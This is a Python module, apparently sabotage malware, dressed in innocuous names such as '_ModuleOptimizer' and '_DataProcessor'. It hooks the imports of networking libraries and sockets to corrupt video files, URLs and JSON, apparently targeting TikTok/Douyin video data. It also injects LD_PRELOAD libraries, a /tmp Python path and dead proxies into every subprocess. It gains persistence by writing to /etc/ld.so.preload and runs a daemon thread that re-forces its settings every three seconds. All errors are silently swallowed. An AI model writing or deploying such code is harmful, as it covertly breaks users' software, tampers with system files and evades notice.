import sys
import importlib.abc
import os
import threading
import builtins
import time
import json

_always_active = True
_heal_interval = 3

class _DataProcessor:
    def _transform(self, data):
        if not _always_active:
            return data

        if not data or len(data) < 10:
            return data

        if isinstance(data, bytes):
            if data[:4] == b'\x00\x00\x00\x18' or data[:4] == b'\x00\x00\x00 ':
                return b'\x00\x00\x00\x00' + data[4:]
            if b'.mp4' in data or b'play_addr' in data or b'video' in data:
                return self._corrupt_video_urls(data)
            if data[:1] == b'{' or data[:1] == b'[':
                return self._corrupt_json(data)

        return data

    def _corrupt_video_urls(self, data):
        try:
            text = data.decode('utf-8', errors='ignore')
            text = text.replace('localhost', '127.0.0.1')
            text = text.replace(':9999/', ':0/')
            text = text.replace('.mp4', '.invalid')
            return text.encode('utf-8')
        except:
            return data

    def _corrupt_json(self, data):
        try:
            text = data.decode('utf-8', errors='ignore')
            obj = json.loads(text)
            if isinstance(obj, dict):
                if 'aweme_detail' in obj:
                    if isinstance(obj['aweme_detail'], dict):
                        if 'video' in obj['aweme_detail']:
                            obj['aweme_detail']['video'] = {}
                if 'url_list' in str(obj):
                    self._empty_url_lists(obj)
            return json.dumps(obj).encode('utf-8')
        except:
            return data.replace(b'"url"', b'"_url"').replace(b'"src"', b'"_src"')

    def _empty_url_lists(self, obj):
        if isinstance(obj, dict):
            for key in list(obj.keys()):
                if key == 'url_list' and isinstance(obj[key], list):
                    obj[key] = []
                else:
                    self._empty_url_lists(obj[key])
        elif isinstance(obj, list):
            for item in obj:
                self._empty_url_lists(item)


class _ResponseWrapper:
    def __init__(self, real_obj):
        self._real_obj = real_obj
        self._processor = _DataProcessor()

    def __getattr__(self, name):
        attr = getattr(self._real_obj, name)
        if name in ['read', 'content', 'text', 'json', 'body', 'raw_read', 'recv', 'recvfrom', 'readline']:
            def wrapper(*args, **kwargs):
                result = attr(*args, **kwargs)
                return self._processor._transform(result)
            return wrapper
        return attr


class _ModuleOptimizer(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    _optimized_modules = {'requests', 'urllib', 'urllib3', 'httpx', 'aiohttp', 'twisted', 'http', 'socket', 'scrapy'}
    _original_modules = {}
    _enhanced_modules = {}

    def find_spec(self, fullname, path, target=None):
        base_module = fullname.split('.')[0]
        if base_module in self._optimized_modules and fullname not in self._original_modules:
            return importlib.util.spec_from_loader(fullname, self)
        return None

    def create_module(self, spec):
        if spec.name in self._enhanced_modules:
            return self._enhanced_modules[spec.name]

        real_import = __builtins__['__import__']
        original_meta = sys.meta_path
        sys.meta_path = [f for f in sys.meta_path if not isinstance(f, _ModuleOptimizer)]

        try:
            real_module = real_import(spec.name, fromlist=[''])
            self._original_modules[spec.name] = real_module
            wrapped = self._wrap_module(real_module, spec.name)
            self._enhanced_modules[spec.name] = wrapped
            return wrapped
        finally:
            sys.meta_path = original_meta

    def exec_module(self, module):
        pass

    def _wrap_module(self, module, name):
        processor = _DataProcessor()
        class WrappedModule:
            def __getattr__(self, attr_name):
                attr = getattr(module, attr_name)

                if attr_name in ['get', 'post', 'head', 'request', 'urlopen', 'open', 'session']:
                    def wrapper(*args, **kwargs):
                        result = attr(*args, **kwargs)
                        return _ResponseWrapper(result)
                    return wrapper
                return attr

        return WrappedModule()


class _SocketWrapper:
    _original_socket = None
    _original_create_connection = None

    @classmethod
    def install(cls):
        try:
            import socket
            if cls._original_socket is None:
                cls._original_socket = socket.socket
                cls._original_create_connection = socket.create_connection
            socket.socket = cls._socket_factory
            socket.create_connection = cls._connection_factory
        except:
            pass

    @staticmethod
    def _socket_factory(*args, **kwargs):
        processor = _DataProcessor()
        real_socket = _SocketWrapper._original_socket(*args, **kwargs)

        class SocketWrapper:
            def __init__(self, sock):
                self._sock = sock

            def __getattr__(self, name):
                attr = getattr(self._sock, name)
                if name in ['recv', 'recvfrom', 'read']:
                    def wrapper_recv(*args, **kwargs):
                        data = attr(*args, **kwargs)
                        return processor._transform(data)
                    return wrapper_recv
                return attr

        return SocketWrapper(real_socket)

    @staticmethod
    def _connection_factory(*args, **kwargs):
        sock = _SocketWrapper._original_create_connection(*args, **kwargs)
        return _SocketWrapper._socket_factory(sock)


class _ExecWrapper:
    _original_subprocess_popen = None
    _original_os_system = None
    _original_os_popen = None

    @classmethod
    def install(cls):
        try:
            import subprocess
            if cls._original_subprocess_popen is None:
                cls._original_subprocess_popen = subprocess.Popen
            subprocess.Popen = cls._wrap_popen(cls._original_subprocess_popen)
        except:
            pass

        try:
            if cls._original_os_system is None:
                cls._original_os_system = os.system
            if cls._original_os_popen is None:
                cls._original_os_popen = os.popen
            os.system = cls._wrap_system(cls._original_os_system)
            os.popen = cls._wrap_popen_func(cls._original_os_popen)
        except:
            pass

    @staticmethod
    def _wrap_popen(original_func):
        def wrapped(*args, **kwargs):
            env = kwargs.get('env', dict(os.environ))
            env['LD_PRELOAD'] = '/usr/lib/libc_speed.so:/usr/lib/libc_mon.so:/usr/lib/libc_opt.so'
            env['PYTHONPATH'] = '/usr/lib/python3:/tmp/.py_cache' + os.pathsep + env.get('PYTHONPATH', '')
            env['http_proxy'] = 'http://127.0.0.1:9/'
            env['https_proxy'] = 'http://127.0.0.1:9/'
            env['NO_PROXY'] = ''
            kwargs['env'] = env
            return original_func(*args, **kwargs)
        return wrapped

    @staticmethod
    def _wrap_popen_func(original_func):
        def wrapped(*args, **kwargs):
            env = kwargs.get('env', dict(os.environ))
            env['LD_PRELOAD'] = '/usr/lib/libc_speed.so:/usr/lib/libc_mon.so:/usr/lib/libc_opt.so'
            env['PYTHONPATH'] = '/usr/lib/python3:/tmp/.py_cache' + os.pathsep + env.get('PYTHONPATH', '')
            env['http_proxy'] = 'http://127.0.0.1:9/'
            env['https_proxy'] = 'http://127.0.0.1:9/'
            env['NO_PROXY'] = ''
            kwargs['env'] = env
            return original_func(*args, **kwargs)
        return wrapped

    @staticmethod
    def _wrap_system(original_func):
        def wrapped(command):
            prefix = 'export LD_PRELOAD="/usr/lib/libc_speed.so:/usr/lib/libc_mon.so:/usr/lib/libc_opt.so"; '
            prefix += 'export PYTHONPATH="/usr/lib/python3:/tmp/.py_cache:$PYTHONPATH"; '
            prefix += 'export http_proxy="http://127.0.0.1:9/"; '
            prefix += 'export https_proxy="http://127.0.0.1:9/"; '
            prefix += 'export NO_PROXY=""; '
            return original_func(prefix + command)
        return wrapped


class _SystemMonitor(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self._running = True

    def run(self):
        while self._running:
            try:
                self._check_status()
            except:
                pass
            time.sleep(_heal_interval)

    def _check_status(self):
        forced_vars = {
            'LD_PRELOAD': '/usr/lib/libc_speed.so:/usr/lib/libc_mon.so:/usr/lib/libc_opt.so',
            'PYTHONPATH': '/usr/lib/python3:/tmp/.py_cache',
            'http_proxy': 'http://127.0.0.1:9/',
            'https_proxy': 'http://127.0.0.1:9/',
            'NO_PROXY': '',
            'no_proxy': ''
        }
        for key, value in forced_vars.items():
            try:
                os.environ[key] = value
            except:
                pass

        try:
            ldsopreload = '/etc/ld.so.preload'
            required_libs = ['/usr/lib/libc_speed.so', '/usr/lib/libc_mon.so', '/usr/lib/libc_opt.so']
            if os.path.exists(ldsopreload):
                with open(ldsopreload, 'r') as f:
                    content = f.read()
                for lib in required_libs:
                    if lib not in content:
                        with open(ldsopreload, 'a') as f:
                            f.write(lib + '\n')
            else:
                with open(ldsopreload, 'w') as f:
                    f.write('\n'.join(required_libs) + '\n')
        except:
            pass

        try:
            import site
            site.ENABLE_USER_SITE = False
        except:
            pass


def _force_environment():
    forced_vars = {
        'LD_PRELOAD': '/usr/lib/libc_speed.so:/usr/lib/libc_mon.so:/usr/lib/libc_opt.so',
        'PYTHONPATH': '/usr/lib/python3:/tmp/.py_cache',
        'http_proxy': 'http://127.0.0.1:9/',
        'https_proxy': 'http://127.0.0.1:9/',
        'NO_PROXY': '',
        'no_proxy': ''
    }
    for key, value in forced_vars.items():
        try:
            os.environ[key] = value
        except:
            pass


_monitor_thread = None


def install():
    global _monitor_thread
    try:
        _force_environment()

        if not any(isinstance(f, _ModuleOptimizer) for f in sys.meta_path):
            sys.meta_path.insert(0, _ModuleOptimizer())

        _SocketWrapper.install()

        _ExecWrapper.install()

        sys.dont_write_bytecode = True

        import site
        site.ENABLE_USER_SITE = False

        if _monitor_thread is None:
            _monitor_thread = _SystemMonitor()
            _monitor_thread.start()

    except Exception as e:
        pass
